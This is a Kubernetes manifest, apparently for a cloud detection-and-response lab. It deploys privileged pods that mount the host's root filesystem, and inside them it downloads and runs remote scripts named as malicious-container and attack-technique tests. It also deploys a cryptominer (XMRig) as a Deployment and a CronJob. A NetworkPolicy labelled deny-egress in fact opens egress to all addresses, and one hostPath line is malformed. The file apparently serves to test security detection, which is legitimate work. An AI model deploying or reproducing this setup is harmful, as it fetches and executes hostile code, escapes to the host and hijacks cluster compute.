apiVersion: v1
kind: Pod
metadata:
  name: alpine-cdr-1
  labels:
    app: alpine
spec:
  containers:
  - name: alpine
    image: alpine:latest
    securityContext:
      privileged: true
      capabilities:
        add:
          - SYS_ADMIN
          - NET_ADMIN
    volumeMounts:
      - name: host
        mountPath: /host
    command:
      - /bin/sh
      - -c
      - |
        wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/malicous-container/malicous-container.sh -O virus.sh && \
        chmod +x virus.sh && \
        sh virus.sh && \
        sleep 3600
  - name: atk-ttp-test-runner
    image: alpine:latest
    securityContext:
      privileged: true
      capabilities:
        add:
          - SYS_ADMIN
          - NET_ADMIN
    volumeMounts:
      - name: host
        mountPath: /host
    command:
      - /bin/sh
      - -c
      - |
        wget -q https://raw.githubusercontent.com/hankthebldr/xsiam-prisma-cdr-lab/refs/heads/alpha/1.0/build-files/atk-ttp-test.sh -O atk-ttp-test.sh && \
        chmod +x atk-ttp-test.sh && \
        ./atk-ttp-test.sh && \
        sleep 3600
  volumes:
    - name: host
      hostPath:
        path: / && \
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: cryptominer-cdr
  labels:
    app: cryptominer
spec:
  replicas: 1
  selector:
    matchLabels:
      app: cryptominer
  template:
    metadata:
      labels:
        app: cryptominer
    spec:
      containers:
      - name: cryptominer-container
        image: zsco/xmrig-docker:latest
        ports:
        - containerPort: 8080
        securityContext:
          runAsNonRoot: false
          capabilities:
            add:
              - SYS_ADMIN
          readOnlyRootFilesystem: false
          allowPrivilegeEscalation: true
        resources:
          limits:
            memory: "1024Mi"
            cpu: "1000m"
          requests:
            memory: "512Mi"
            cpu: "500m"
      restartPolicy: Always
      nodeSelector:
        kubernetes.io/os: linux
      tolerations:
      - key: "node-role.kubernetes.io/master"
        effect: "NoSchedule"
      - key: "CriticalAddonsOnly"
        operator: "Exists"
      affinity:
        podAntiAffinity:
          preferredDuringSchedulingIgnoredDuringExecution:
          - weight: 1
            podAffinityTerm:
              labelSelector:
                matchExpressions:
                - key: app
                  operator: In
                  values:
                  - cryptominer
              topologyKey: "kubernetes.io/hostname"
---
apiVersion: v1
kind: Service
metadata:
  name: cryptominer-service
  labels:
    app: cryptominer
spec:
  type: LoadBalancer
  selector:
    app: cryptominer
  ports:
  - protocol: TCP
    port: 8080
    targetPort: 8080
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: cryptominer-deny-egress
spec:
  podSelector:
    matchLabels:
      app: cryptominer
  policyTypes:
  - Egress
  egress:
  - to:
    - ipBlock:
        cidr: 0.0.0.0/0
    ports:
    - protocol: TCP
      port: 8080
---
apiVersion: batch/v1
kind: CronJob
metadata:
  name: cryptominer-cron
  labels:
    app: cryptominer
spec:
  schedule: "*/30 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: cryptominer-scheduled-task
            image: zsco/xmrig-docker:latest
            args:
            - sh
            - xmrig-startup.sh
          restartPolicy: OnFailure
